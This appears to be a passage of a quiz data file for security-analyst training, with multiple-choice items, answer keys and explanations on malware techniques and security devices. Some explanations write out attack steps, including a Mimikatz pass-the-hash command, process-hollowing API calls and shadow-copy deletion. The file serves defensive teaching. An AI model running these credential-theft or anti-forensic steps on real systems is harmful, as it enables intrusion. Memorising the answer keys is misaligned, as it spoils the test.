            explanation: '🎯 IOCs (Indicators of Compromise): Evidence of breach/malware. Tier-1 IOC types: 1) **Network IOCs** - IP addresses, domains, URLs, email addresses, 2) **File IOCs** - hash (MD5/SHA1/SHA256), filename, path, size, 3) **Host IOCs** - registry keys, mutex names, service names, scheduled tasks, 4) **Behavioral** - process names, command-lines. YARA = pattern matching language (requires rule creation skills - Tier-2). IOC usage: SIEM correlation rules, EDR hunting, firewall blocks, threat intel feeds (STIX/TAXII). Tools: MISP (threat intel platform), OpenIOC format, CSV/JSON IOC lists. Pyramid of Pain: Hash (easy to change) < Filename < IP/Domain < Tools < TTPs (hardest). MITRE ATT&CK focuses on TTPs.'
        },
        {
            id: 'mal41',
            title: 'Emotet Malware Behavior',
            points: 8,
            question: 'Emotet malware is BEST described as:',
            type: 'radio',
            options: [
                { value: 'loader', text: 'Modular malware loader' },
                { value: 'ransomware', text: 'Direct ransomware' },
                { value: 'adware', text: 'Adware' },
                { value: 'keylogger', text: 'Simple keylogger' },
                { value: 'wiper', text: 'Wiper malware' },
                { value: 'spyware', text: 'Spyware' }
            ],
            correct: 'loader',
            explanation: '📦 Emotet: **Modular malware-as-a-service** (loader/dropper). Infection chain: 1) Phishing email with macro doc, 2) Macro downloads Emotet DLL, 3) Emotet establishes C2, 4) Downloads modules (email harvesting, spreading, credential theft), 5) Delivers **Stage-2 payloads** (Trickbot banking trojan, Ryuk/Conti ransomware). Notorious: 2014-2021 (takedown: Operation Ladybird). Spreading: Email thread hijacking (replies to stolen emails - appears legitimate), network propagation (SMB/WMIC). Detection: Macro analysis, PowerShell logging, network beaconing, Emotet IOCs (Abuse.ch). Defense: Disable macros, email filtering, network segmentation. Reappeared 2021-2022. MITRE T1204 (User Execution), T1566 (Phishing).'
        },
        {
            id: 'mal42',
            title: 'Process Hollowing Technique',
            points: 9,
            question: 'Process hollowing malware creates legitimate process (svchost.exe) in suspended state, replaces memory with malicious code, resumes. What is the advantage?',
            type: 'radio',
            options: [
                { value: 'evasion', text: 'Evasion' },
                { value: 'privilege', text: 'Privilege escalation to SYSTEM' },
                { value: 'persistence', text: 'Persistence mechanism' },
                { value: 'faster', text: 'Faster execution speed' },
                { value: 'encryption', text: 'Encrypts the payload' },
                { value: 'network', text: 'Network communication encryption' }
            ],
            correct: 'evasion',
            explanation: '🎭 Process Hollowing (MITRE T1055.012): Sophisticated injection technique. Steps: 1) **CreateProcess** with CREATE_SUSPENDED flag (start legitimate process paused), 2) **NtUnmapViewOfSection** (unmap legitimate code from memory), 3) **VirtualAllocEx + WriteProcessMemory** (write malicious code), 4) **SetThreadContext** (update EIP to malicious entry point), 5) **ResumeThread** (execute). Result: Task Manager shows svchost.exe but executes malware (deceives users/AV). Detection: Memory analysis (mismatch between disk image and memory), parent-child process anomalies, Sysmon EventID 25 (process tampering), EDR. Defense: Memory integrity checks, behavioral monitoring. Variants: Process doppelgänging, process transmogrification. Example: ZeroT malware, Carberp.'
        },
        {
            id: 'mal43',
            title: 'Pass-the-Hash Attack',
            points: 8,
            question: 'Attacker extracted NTLM hash from compromised workstation, authenticates to file server WITHOUT cracking password. Which tool enables this?',
            type: 'radio',
            options: [
                { value: 'mimikatz', text: 'Mimikatz' },
                { value: 'john', text: 'John the Ripper' },
                { value: 'hydra', text: 'Hydra' },
                { value: 'nmap', text: 'Nmap' },
                { value: 'metasploit', text: 'Metasploit framework' },
                { value: 'hashcat', text: 'Hashcat' }
            ],
            correct: 'mimikatz',
            explanation: '🔑 Pass-the-Hash (MITRE T1550.002): Use NTLM hash directly for authentication (no password cracking needed). Windows challenge-response: Server sends challenge → Client encrypts with NTLM hash → Hash is authentication credential. Attack: 1) Dump LSASS (get hashes - Mimikatz/Procdump), 2) **Mimikatz pth**: sekurlsa::pth /user:admin /domain:corp /ntlm:<hash> /run:cmd.exe → Opens cmd with admin token, 3) Access resources (net use, PsExec). Defense: Disable NTLM (enforce Kerberos), Protected Users group (no NTLM caching), credential tiering, random local admin passwords (LAPS). Detection: EventID 4624 Logon Type 3 + NTLM, unusual lateral movement. Tools: Mimikatz, Impacket (psexec.py -hashes), CrackMapExec.'
        },
        {
            id: 'mal44',
            title: 'Malware Persistence - Services',
            points: 7,
            question: 'Malware creates Windows service: Name="WindowsUpdate", DisplayName="Windows Update Service", BinaryPath="C:\\ProgramData\\svchost.exe". What is suspicious?',
            type: 'radio',
            options: [
                { value: 'binary_path', text: 'Binary path' },
                { value: 'name', text: 'Service name "WindowsUpdate" is always malicious' },
                { value: 'display_name', text: 'Display name is too generic' },
                { value: 'nothing', text: 'Nothing suspicious' },
                { value: 'admin', text: 'Service requires admin privileges' },
                { value: 'startup', text: 'Automatic startup is suspicious' }
            ],
            correct: 'binary_path',
            explanation: '⚙️ Malicious Service (MITRE T1543.003): Create Windows service for persistence + privilege escalation (services run as SYSTEM). Red flags: 1) **Binary location** - legitimate Windows services: C:\\Windows\\System32 or C:\\Windows\\SysWOW64, NOT ProgramData/Temp/AppData, 2) **Typosquatting names** - "WindowsUpdate" vs legitimate "wuauserv", 3) **Random/generic descriptions**. Legitimate svchost.exe: Multiple instances (each -k parameter hosts service DLLs), always in System32. Detection: sc query, Get-Service (PowerShell), autoruns.exe (Sysinternals), unusual service creation (EventID 7045), VirusTotal check binary hash. Removal: sc stop <service> && sc delete <service>. Defense: Application whitelisting, service creation monitoring, baseline service inventory.'
        },
        {
            id: 'mal45',
            title: 'Cobalt Strike Beacon Detection',
            points: 9,
            question: 'Commercial pentesting tool "Cobalt Strike" is frequently abused by attackers. Which indicators suggest Cobalt Strike Beacon? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'named_pipes', text: 'Named pipes with pattern: \\msagent_##, \\postex_##, \\MSSE-####' },
                { value: 'injected_processes', text: 'Injected into common processes' },
                { value: 'http_beaconing', text: 'HTTP GET/POST beaconing with specific User-Agent strings' },
                { value: 'smb_beacon', text: 'SMB named pipe beaconing' },
                { value: 'normal_traffic', text: 'Normal web browsing traffic' },
                { value: 'email', text: 'Standard email protocols' }
            ],
            correct: ['named_pipes', 'injected_processes', 'http_beaconing', 'smb_beacon'],
            explanation: '🎯 Cobalt Strike Detection: Commercial C2 framework (licensed for pentesting, cracked versions used by threat actors). Beacon indicators: 1) **Named pipes** - default: msagent_##, MSSE-####-server, postex_#### (SMB beacon communication), 2) **Process injection** - spawns processes (rundll32, dllhost) with no parent/command-line, 3) **HTTP beaconing** - customizable but defaults exist (User-Agent patterns, URI paths like /submit.php), 4) **Memory strings** - "ReflectiveLoader", beacon config. Detection: Memory analysis (BeaconEye, CobaltStrikeScan), network signatures (Snort/Suricata rules), YARA rules (detect beacon DLL), named pipe monitoring. Defense: EDR behavioral rules, network IDS, Malleable C2 profile detection. MITRE T1071, T1055, T1090.'
        },
        {
            id: 'mal46',
            title: 'Malspam Campaign Indicators',
            points: 7,
            question: 'Organization receives 500+ emails in 2 hours: Similar subject lines, same sender domain (invoice-notifications.com), ZIP attachments. What is this?',
            type: 'radio',
            options: [
                { value: 'malspam_campaign', text: 'Malspam campaign' },
                { value: 'spearphishing', text: 'Targeted spearphishing attack' },
                { value: 'legitimate', text: 'Legitimate bulk email from vendor' },
                { value: 'bec', text: 'Business Email Compromise' },
                { value: 'whaling', text: 'Whaling attack' },
                { value: 'spam', text: 'Regular spam' }
            ],
            correct: 'malspam_campaign',
            explanation: '📧 Malspam (MITRE T1566.001): Mass-scale malicious email campaigns (hundreds/thousands recipients). Characteristics: 1) **Volume** - bulk delivery (short time window), 2) **Generic content** - invoices, shipping notifications, resumes, 3) **Attachments** - ZIP/RAR (contains .exe, .js, .doc with macros), 4) **Urgency** - "Urgent invoice", "Payment overdue". vs Spearphishing (targeted, researched, personalized), BEC (impersonates executive, wire transfer request). Examples: Emotet, Trickbot distribution. Detection: Email gateway (reputation, attachment analysis), DMARC/SPF/DKIM failure, threat intel feeds (malspam tracker from Abuse.ch). Response: Block sender domain, quarantine all messages, sandbox attachment, update signatures.'
        },
        {
            id: 'mal47',
            title: 'Reflective DLL Injection',
            points: 9,
            question: 'Reflective DLL injection differs from standard DLL injection how?',
            type: 'radio',
            options: [
                { value: 'manual_load', text: 'Manually loads DLL in memory' },
                { value: 'faster', text: 'Faster execution than standard injection' },
                { value: 'encrypted', text: 'DLL is encrypted on disk' },
                { value: 'admin_rights', text: 'Requires administrator privileges' },
                { value: 'network', text: 'DLL is loaded over network share' },
                { value: 'signed', text: 'DLL must be digitally signed' }
            ],
            correct: 'manual_load',
            explanation: '💉 Reflective DLL Injection (MITRE T1055.001): Advanced stealthy injection. **Standard DLL injection**: Write DLL path → CreateRemoteThread(LoadLibrary) → Windows loader loads DLL (registry, file system involved). **Reflective**: 1) DLL contains "ReflectiveLoader" function (bootstrap code), 2) Allocate memory in target process, 3) Write entire DLL as binary blob, 4) Resolve relocations/imports manually (no Windows loader), 5) Execute ReflectiveLoader. Advantages: No disk access, no LoadLibrary call (evades DLL load monitoring), memory-only. Used by: Cobalt Strike, Meterpreter, commercial red team tools. Detection: Memory analysis (unusual RWX memory, unknown DLLs), behavior monitoring, hunt for ReflectiveLoader strings. Defense: CFG (Control Flow Guard), memory scanning EDR.'
        },
        {
            id: 'mal48',
            title: 'Malware Static String Analysis',
            points: 6,
            question: 'Running strings.exe on malware reveals: "192.0.2.50:443", "cmd.exe /c whoami", "SeDebugPrivilege", "mimikatz". What can we infer? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'c2_ip', text: 'C2 server IP: 192.0.2.50 port 443' },
                { value: 'command_execution', text: 'Executes system commands' },
                { value: 'credential_dumping', text: 'Credential dumping capability' },
                { value: 'privilege_escalation', text: 'Privilege escalation' },
                { value: 'ransomware', text: 'Definitely ransomware' },
                { value: 'safe', text: 'Safe application' }
            ],
            correct: ['c2_ip', 'command_execution', 'credential_dumping', 'privilege_escalation'],
            explanation: '🔤 String Analysis: Extract hardcoded text from binaries. Tools: strings.exe (Sysinternals), FLOSS (obfuscated strings), binwalk. Findings: 1) **192.0.2.50:443** - likely C2 IP/port (investigate with threat intel), 2) **cmd.exe /c whoami** - command execution (system reconnaissance), 3) **SeDebugPrivilege** - enables LSASS memory access (credential dumping prerequisite), 4) **mimikatz** - credential theft tool reference (embedded or downloads). Cannot conclude ransomware (no encryption strings like AES/RSA). Other useful strings: URLs, registry keys, filenames, error messages, compiler artifacts, PDB paths. Technique: Basic static analysis, safe (no execution). Limitations: Obfuscated/packed malware hides strings. FLOSS (FireEye Labs) extracts decoded strings.'
        },
        {
            id: 'mal49',
            title: 'WannaCry Ransomware Worm',
            points: 8,
            question: 'WannaCry (2017) spread rapidly without user interaction using which vulnerability?',
            type: 'radio',
            options: [
                { value: 'eternalblue', text: 'EternalBlue' },
                { value: 'heartbleed', text: 'Heartbleed' },
                { value: 'shellshock', text: 'Shellshock' },
                { value: 'bluekeep', text: 'BlueKeep' },
                { value: 'zerologon', text: 'Zerologon' },
                { value: 'log4shell', text: 'Log4Shell' }
            ],
            correct: 'eternalblue',
            explanation: '🌍 WannaCry (May 2017): Ransomware worm causing global outbreak (200k+ computers, 150 countries, $4B+ damage). Exploit: **EternalBlue** (NSA tool leaked by Shadow Brokers) - CVE-2017-0144 (SMBv1 buffer overflow → remote code execution). Worm behavior: Scan IP ranges for SMB 445/TCP → exploit → install ransomware → encrypt files → repeat (self-propagating). Kill switch: Researcher registered hardcoded domain (iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com) → malware checked domain, if registered → stopped spreading. Impact: NHS (UK), FedEx, Renault. Patch: MS17-010 (March 2017 - 2 months before attack). Lesson: Patch management critical, disable SMBv1, network segmentation. Attribution: Lazarus Group (North Korea). MITRE T1210 (Exploitation of Remote Services).'
        },
        {
            id: 'mal50',
            title: 'Malware Analysis - Behavioral Indicators',
            points: 8,
            question: 'During dynamic analysis, which behaviors are HIGH-SEVERITY indicators? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'encryption', text: 'Mass file encryption with extension changes' },
                { value: 'lsass_access', text: 'Accessing LSASS process memory' },
                { value: 'disable_security', text: 'Disabling Windows Defender or deleting shadow copies' },
                { value: 'c2_connection', text: 'Establishing external C2 connection' },
                { value: 'read_hosts', text: 'Reading C:\\Windows\\System32\\drivers\\etc\\hosts file' },
                { value: 'check_disk', text: 'Querying available disk space' }
            ],
            correct: ['encryption', 'lsass_access', 'disable_security', 'c2_connection'],
            explanation: '🔴 High-Severity Behaviors (Dynamic Analysis): Critical malicious indicators during execution: 1) **Mass encryption** + extension change (.locked, .encrypted) = Ransomware (MITRE T1486), 2) **LSASS access** (OpenProcess LSASS.exe) = credential theft (T1003), 3) **Security tampering** - disable AV, delete VSS (vssadmin delete), bcdedit recoveryenabled no = Anti-forensics (T1562, T1490), 4) **C2 beaconing** = external command & control (T1071). Less severe: Read hosts file (reconnaissance, not necessarily malicious), disk space check (common legitimate behavior). Analysis tools: Process Monitor (Procmon - file/registry/network), Process Hacker, API Monitor, Wireshark, Noriben (automated Procmon). Report findings: TTPs (MITRE ATT&CK mapping), IOCs, screenshots, PCAP. Tier-1: Recognize behaviors, escalate to Tier-2 for deeper reversing.'
        }
    ],
    devices: [
        {
            id: 'dev1',
            title: 'Security Device Selection',
            points: 15,
            question: 'Match each security requirement to the BEST device:',
            type: 'matching',
            pairs: [
                { id: 'pair1', label: 'Block SQL injection attacks on web application', answer: '', options: ['WAF', 'IDS', 'NGFW', 'EDR', 'SIEM', 'Email Gateway'], correct: 'WAF' },
                { id: 'pair2', label: 'Detect lateral movement on endpoints', answer: '', options: ['WAF', 'IDS', 'NGFW', 'EDR', 'SIEM', 'Email Gateway'], correct: 'EDR' },
                { id: 'pair3', label: 'Correlate events from 50+ log sources', answer: '', options: ['WAF', 'IDS', 'NGFW', 'EDR', 'SIEM', 'Email Gateway'], correct: 'SIEM' }
            ]
        },
        {
            id: 'dev2',
            title: 'IDS vs IPS',
            points: 8,
            question: 'What is the key difference between IDS (Intrusion Detection System) and IPS (Intrusion Prevention System)?',
            type: 'radio',
            options: [
                { value: 'inline', text: 'IDS monitors passively, IPS sits inline and can block traffic' },
                { value: 'speed', text: 'IDS is faster than IPS' },
                { value: 'signatures', text: 'IDS uses signatures, IPS uses behavioral analysis' },
                { value: 'cost', text: 'IDS is more expensive than IPS' },
                { value: 'same', text: 'They are the same technology with different names' }
            ],
            correct: 'inline',
            explanation: '🛡️ IDS vs IPS: **IDS** = Detection only, passive monitoring (SPAN/mirror port), alerts security team, cannot block. **IPS** = Prevention, inline deployment (traffic flows through it), can block/drop malicious packets in real-time. Trade-off: IPS adds latency, false positive = service disruption. IDS = no disruption but slower response (human must act). Modern deployments: IPS at perimeter (high confidence signatures), IDS internally (detection + forensics). Vendors: Snort (IDS/IPS), Suricata, Palo Alto Threat Prevention.'
        },
        {
            id: 'dev3',
            title: 'WAF Deployment Modes',
            points: 7,
            question: 'Web Application Firewall can be deployed in multiple modes. Which provides the MOST security?',
            type: 'radio',
            options: [
                { value: 'inline_block', text: 'Inline blocking mode' },
                { value: 'monitor', text: 'Monitor/detection mode' },
                { value: 'reverse_proxy', text: 'Reverse proxy mode' },
                { value: 'cdn', text: 'CDN-integrated WAF' },
                { value: 'agent', text: 'Agent-based WAF' }
            ],
            correct: 'inline_block',
            explanation: '🌐 WAF Modes: **Blocking/Prevention** = inline, drops malicious requests before reaching app (OWASP Top 10 protection). **Detection/Monitor** = alerts only (safe initial deployment to tune rules). **Reverse Proxy** = same as inline (WAF proxies requests). Deploy phases: 1) Monitor (baseline traffic, tune rules), 2) Blocking (enforce rules). False positives hurt: Block legitimate customers = revenue loss. WAF vendors: ModSecurity, Cloudflare WAF, AWS WAF, F5 Advanced WAF, Imperva. Layer 7 protection (application layer).'
        },
        {
            id: 'dev4',
            title: 'Email Gateway Features',
            points: 9,
            question: 'Which features are typical of a Secure Email Gateway (SEG)? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'spam', text: 'Spam filtering and reputation-based blocking' },
                { value: 'malware', text: 'Malware/attachment sandboxing' },
                { value: 'phishing', text: 'Phishing detection' },
                { value: 'dlp', text: 'Data Loss Prevention' },
                { value: 'firewall', text: 'Network firewall packet filtering' },
                { value: 'ids', text: 'Network intrusion detection signatures' }
            ],
            correct: ['spam', 'malware', 'phishing', 'dlp'],
            explanation: '📧 Secure Email Gateway (SEG): Layer 7 email security. Features: 1) **Spam filter** (RBL, SPF/DKIM/DMARC validation, Bayesian), 2) **Malware scanning** (attachments, sandboxing .doc/.xls macros), 3) **Anti-phishing** (URL rewriting, brand impersonation detection, YARA rules), 4) **DLP** (prevent data leakage). NOT: Network firewall/IDS (different layer). Vendors: Proofpoint, Mimecast, Microsoft Defender for Office 365, Cisco ESA. Deploy: MX record points to SEG → SEG → Internal mail server. 91% of attacks start with email (Verizon DBIR).'
        },
        {
            id: 'dev5',
            title: 'SIEM Architecture',
            points: 10,
            question: 'Organization collects logs from 200+ sources. Which components are essential in SIEM architecture? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'collectors', text: 'Log collectors/forwarders' },
                { value: 'normalization', text: 'Log normalization/parsing' },
                { value: 'correlation', text: 'Correlation engine' },
                { value: 'storage', text: 'Long-term storage' },
                { value: 'firewall', text: 'Built-in firewall for perimeter defense' },
                { value: 'antivirus', text: 'Endpoint antivirus protection' }
            ],
            correct: ['collectors', 'normalization', 'correlation', 'storage'],
            explanation: '📊 SIEM Components: 1) **Collectors** (Syslog, agents, APIs - send logs to SIEM), 2) **Normalization** (convert diverse formats to common schema), 3) **Correlation** (rules detect patterns: "Failed login × 10 then success = brute force"), 4) **Storage** (hot/warm/cold storage, 90 days+ retention), 5) **Dashboards/Alerting**. NOT: Firewall/AV (separate products, feed logs TO SIEM). SIEMs: Splunk, Sentinel, ELK, QRadar. Use cases: Threat detection, compliance (PCI-DSS, HIPAA), forensics. Architecture: agents → indexers → search heads.'
        },
        {
            id: 'dev6',
            title: 'EDR Capabilities',
            points: 9,
            question: 'EDR (Endpoint Detection & Response) provides capabilities beyond traditional antivirus. Which are EDR features? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'behavioral', text: 'Behavioral analysis' },
                { value: 'forensics', text: 'Forensics timeline' },
                { value: 'isolation', text: 'Network isolation/containment of compromised hosts' },
                { value: 'threat_hunt', text: 'Threat hunting queries' },
                { value: 'port_scan', text: 'Network port scanning' },
                { value: 'web_filter', text: 'Web content filtering' }
            ],
            correct: ['behavioral', 'forensics', 'isolation', 'threat_hunt'],
            explanation: '🔍 EDR vs Traditional AV: AV = signature-based, reactive. EDR = behavioral, proactive, forensics. Features: 1) **Behavioral** (monitor API calls, memory injection, registry changes), 2) **Forensics** (record everything - process lineage, network connections, file modifications), 3) **Isolation** (quarantine infected host with 1 click), 4) **Threat Hunting** (search "all endpoints accessing evil.com"), 5) **Automated response** (kill process, delete file). NOT: Network functions (port scan, web filter). Products: CrowdStrike, Carbon Black, SentinelOne, Microsoft Defender for Endpoint. MITRE ATT&CK mapped detections.'
        },
        {
            id: 'dev7',
            title: 'NGFW vs Traditional Firewall',
            points: 8,
            question: 'What advanced capabilities does NGFW (Next-Generation Firewall) add beyond traditional stateful firewalls?',
            type: 'checkbox',
            options: [
                { value: 'app_aware', text: 'Application awareness' },
                { value: 'ips', text: 'Integrated IPS' },
                { value: 'ssl_inspect', text: 'SSL/TLS decryption and inspection' },
                { value: 'user_id', text: 'User identity integration' },
                { value: 'nat', text: 'Network Address Translation' },
                { value: 'routing', text: 'Layer 3 routing' }
            ],
            correct: ['app_aware', 'ips', 'ssl_inspect', 'user_id'],
            explanation: '🔥 NGFW Features: Traditional FW = Layer 3/4 (IP, port, protocol). NGFW adds: 1) **App-ID** (detect BitTorrent on port 443, SSH tunnels), 2) **IPS** (signature-based threat prevention), 3) **SSL Inspection** (decrypt HTTPS to inspect encrypted malware), 4) **User-ID** (rules by user/group not just IP), 5) **Threat intel integration**, 6) **Sandboxing**. NAT/routing = traditional features (not "next-gen"). Vendors: Palo Alto, Fortinet, Check Point, Cisco FirePOWER. Gartner Magic Quadrant for NGFW. ROI: Consolidate multiple devices (FW + IPS + proxy) into one.'
        },
        {
            id: 'dev8',
            title: 'DDoS Protection Layers',
            points: 8,
            question: 'Multi-layered DDoS protection strategy includes which components? (Select ALL effective)',
            type: 'checkbox',
            options: [
                { value: 'cdn', text: 'CDN/Cloud scrubbing' },
                { value: 'rate_limit', text: 'Rate limiting at application layer' },
                { value: 'bgp', text: 'BGP blackholing/null routing' },
                { value: 'firewall', text: 'Firewall SYN cookies' },
                { value: 'antivirus', text: 'Endpoint antivirus on servers' },
                { value: 'encryption', text: 'Encrypting all server traffic' }
            ],
            correct: ['cdn', 'rate_limit', 'bgp', 'firewall'],
            explanation: '🌊 DDoS Defense Layers: **Layer 3/4 (volumetric)**: 1) **CDN/scrubbing** (Cloudflare, Akamai - absorb 1Tbps+ attacks), 2) **BGP blackhole** (ISP drops traffic at edge), 3) **SYN cookies** (stateless TCP handshake). **Layer 7 (application)**: 4) **Rate limiting** (throttle requests per IP), 5) **WAF** (block malicious payloads), 6) **CAPTCHA** (differentiate bots). AV/encryption don\'t help DDoS. Attack types: UDP flood, SYN flood, amplification (DNS, NTP), Slowloris (app layer). Mitigation: Anycast routing, over-provision bandwidth, incident response plan. DDoS-for-hire booters cost $10/month.'
        },
        {
            id: 'dev9',
            title: 'DNS Security Solutions',
            points: 7,
            question: 'Which DNS security solution prevents users from accessing malicious domains (C2, phishing)?',
            type: 'radio',
            options: [
                { value: 'dns_filter', text: 'DNS filtering/sinkhole' },
                { value: 'dnssec', text: 'DNSSEC' },
                { value: 'dns_over_https', text: 'DNS-over-HTTPS' },
                { value: 'split_dns', text: 'Split-horizon DNS' },
                { value: 'round_robin', text: 'Round-robin DNS' }
            ],
            correct: 'dns_filter',
            explanation: '🛡️ Protective DNS: DNS filtering = intercept DNS queries, block known-bad domains (malware C2, phishing, botnets). Cisco Umbrella, Quad9 (9.9.9.9), Cloudflare for Teams maintain threat intel feeds. User requests evil.com → DNS filter returns 0.0.0.0 or captive portal. Advantages: 1) Works for ALL devices (no agent), 2) Prevents infection (block before download), 3) Visibility (see all DNS queries). DNSSEC = authenticity not filtering. DoH = privacy not security (can bypass corporate DNS). Deploy: Point DHCP to filtering DNS server. Blocks: DGA domains, newly registered domains, typosquatting.'
        },
        {
            id: 'dev10',
            title: 'Sandbox Analysis',
            points: 9,
            question: 'Malware sandbox (Cuckoo, Joe Sandbox, ANY.RUN) provides which analysis capabilities? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'behavior', text: 'Behavioral analysis' },
                { value: 'safe_exec', text: 'Safe execution in isolated environment' },
                { value: 'ioc', text: 'IoC extraction' },
                { value: 'report', text: 'Automated analysis report with MITRE ATT&CK mapping' },
                { value: 'prevention', text: 'Prevent malware from executing on network' },
                { value: 'patch', text: 'Automatically patch vulnerabilities' }
            ],
            correct: ['behavior', 'safe_exec', 'ioc', 'report'],
            explanation: '🧪 Malware Sandbox: Automated dynamic analysis in VM. Process: 1) Upload suspicious file, 2) Execute in VM (Windows/Linux), 3) Monitor behavior (Process Monitor, API hooks, network capture), 4) Generate report (screenshots, IoCs, ATT&CK). Output: Registry changes, dropped files, DNS queries, HTTP requests, YARA matches. Limitations: Sandbox evasion (VM detection, time delays, geofencing). NOT: Prevention device (analysis only), doesn\'t patch. Sandboxes: Public (VirusTotal, hybrid-analysis.com), Private (Cuckoo, FireEye). Integration: Email gateway auto-submits attachments, EDR submits unknown executables.'
        },
        {
            id: 'dev11',
            title: 'Load Balancer Security',
            points: 6,
            question: 'Load balancers can provide security benefits. Which are valid security features? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'ssl_offload', text: 'SSL/TLS termination' },
                { value: 'health', text: 'Health checks' },
                { value: 'rate_limit', text: 'Rate limiting/connection limits' },
                { value: 'hide_backend', text: 'Hide backend server IPs' },
                { value: 'antivirus', text: 'Built-in antivirus scanning' },
                { value: 'encryption', text: 'End-to-end encryption of all data at rest' }
            ],
            correct: ['ssl_offload', 'health', 'rate_limit', 'hide_backend'],
            explanation: '⚖️ Load Balancer Security: LB = distribute traffic + security features. 1) **SSL termination** (LB handles TLS, certs in one place, backends use HTTP), 2) **Health checks** (auto-remove unresponsive servers - could be compromised/DDoS target), 3) **Rate limiting** (per-IP throttling), 4) **IP masking** (backend servers not directly exposed). Advanced LB: **WAF integration** (F5 BIG-IP ASM), **DDoS protection**. NOT: AV scanning (different layer), data-at-rest encryption (that\'s storage encryption). Products: HAProxy, NGINX Plus, F5, AWS ELB/ALB. Algorithms: Round-robin, least connections, IP hash.'
        },
        {
            id: 'dev12',
            title: 'Network Access Control (NAC)',
            points: 9,
            question: 'NAC (Network Access Control) enforces security policies before devices join network. What can NAC verify? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'compliance', text: 'Device compliance' },
                { value: 'auth', text: 'User/device authentication' },
                { value: 'vlan', text: 'Dynamic VLAN assignment based on device type/health' },
                { value: 'quarantine', text: 'Quarantine non-compliant devices to remediation network' },
                { value: 'malware_removal', text: 'Automatically remove malware from infected devices' },
                { value: 'wireless_jamming', text: 'Jam rogue wireless access points' }
            ],
            correct: ['compliance', 'auth', 'vlan', 'quarantine'],
            explanation: '🚪 Network Access Control: Zero Trust network = verify before granting access. NAC functions: 1) **Posture assessment** (agent checks AV, patches, firewall, encryption), 2) **802.1X authentication** (RADIUS/TACACS+), 3) **Role-based access** (VLAN assignment - employee, guest, IoT), 4) **Quarantine** (non-compliant → restricted VLAN with patch server access only). NOT: Malware removal (that\'s EDR/AV), wireless jamming (illegal). Products: Cisco ISE, Aruba ClearPass, ForeScout. Flow: Device connects → NAC checks health → Pass (production VLAN) or Fail (quarantine). Use case: BYOD security, IoT device visibility.'
        },
        {
            id: 'dev13',
            title: 'Web Proxy Features',
            points: 7,
            question: 'Forward proxy (explicit proxy) deployed for users provides which security benefits? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'url_filter', text: 'URL filtering/categorization' },
                { value: 'ssl_inspect', text: 'SSL inspection' },
                { value: 'dlp', text: 'Data loss prevention' },
                { value: 'cache', text: 'Content caching' },
                { value: 'firewall', text: 'Layer 3 packet filtering' },
                { value: 'email', text: 'Email spam filtering' }
            ],
            correct: ['url_filter', 'ssl_inspect', 'dlp', 'cache'],
            explanation: '🌐 Web Proxy Security: Forward proxy = users configure browser to proxy (or WPAD/transparent). Features: 1) **URL filtering** (block categories: gambling, malware, adult content), 2) **SSL inspection** (man-in-the-middle to scan HTTPS - requires CA cert push), 3) **DLP** (prevent Dropbox uploads of sensitive docs), 4) **Logging** (user web activity), 5) **Caching** (performance bonus). NOT: L3 firewall (different device), email (different protocol). Products: Squid, Blue Coat/Symantec ProxySG, Zscaler. Privacy concerns: SSL inspection = decrypt user traffic (legal/HR compliance needed). Bypass: VPNs, DNS-over-HTTPS.'
        },
        {
            id: 'dev14',
            title: 'Deception Technology',
            points: 8,
            question: 'Honeypots/honeynets detect attackers by deploying fake systems. What are key characteristics? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'decoy', text: 'Decoy systems mimicking production' },
                { value: 'early_warning', text: 'Early warning' },
                { value: 'threat_intel', text: 'Gather threat intelligence' },
                { value: 'slow_down', text: 'Slow down attackers' },
                { value: 'prevent', text: 'Prevent all attacks automatically' },
                { value: 'patch', text: 'Automatically patch production systems' }
            ],
            correct: ['decoy', 'early_warning', 'threat_intel', 'slow_down'],
            explanation: '🍯 Deception Technology: Honeypots = intentional vulnerable/fake systems. Value: 1) **High-fidelity alerts** (no false positives - production never touches honeypot), 2) **Early detection** (lateral movement, internal recon), 3) **Intel gathering** (log attacker tools, techniques), 4) **Deflection** (attacker wastes time on decoys). Types: Low-interaction (emulated services), high-interaction (real VMs). Deploy: Canary tokens (fake files, AWS keys), honeypot servers, fake AD accounts. NOT: Prevention (detection only), patching (separate process). Products: Thinkst Canary, TrapX, Illusive Networks. Legal: Document honeypot policy (entrapment concerns).'
        },
        {
            id: 'dev15',
            title: 'CASB (Cloud Access Security Broker)',
            points: 9,
            question: 'Organization uses SaaS apps (Office 365, Salesforce, Dropbox). What does CASB provide? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'visibility', text: 'Shadow IT discovery' },
                { value: 'dlp', text: 'Cloud DLP' },
                { value: 'threat', text: 'Threat protection' },
                { value: 'compliance', text: 'Compliance monitoring' },
                { value: 'hosting', text: 'Host the SaaS applications' },
                { value: 'coding', text: 'Develop custom cloud applications' }
            ],
            correct: ['visibility', 'dlp', 'threat', 'compliance'],
            explanation: '☁️ CASB Functions: Sits between users and cloud providers. 4 Pillars: 1) **Visibility** (discover all cloud apps - sanctioned/unsanctioned), 2) **Data Security** (DLP policies, encrypt sensitive data before upload), 3) **Threat Protection** (detect compromised accounts via UEBA, block malware), 4) **Compliance** (enforce policies - MFA required, data residency). Deployment: API-based (sanctioned apps) or proxy (inline for all cloud traffic). NOT: Hosting/development (that\'s IaaS/PaaS). Products: Microsoft Defender for Cloud Apps, Netskope, Zscaler. Use case: "User uploaded 10,000 files to personal Dropbox" = DLP alert.'
        },
        {
            id: 'dev16',
            title: 'VPN Types and Security',
            points: 7,
            question: 'Which VPN type provides the MOST security for remote access?',
            type: 'radio',
            options: [
                { value: 'ssl_vpn_mfa', text: 'SSL VPN with MFA + certificate-based auth + posture check' },
                { value: 'pptp', text: 'PPTP' },
                { value: 'l2tp', text: 'L2TP without IPsec' },
                { value: 'ipsec_psk', text: 'IPsec with pre-shared key only' },
                { value: 'no_vpn', text: 'Direct internet access' }
            ],
            correct: 'ssl_vpn_mfa',
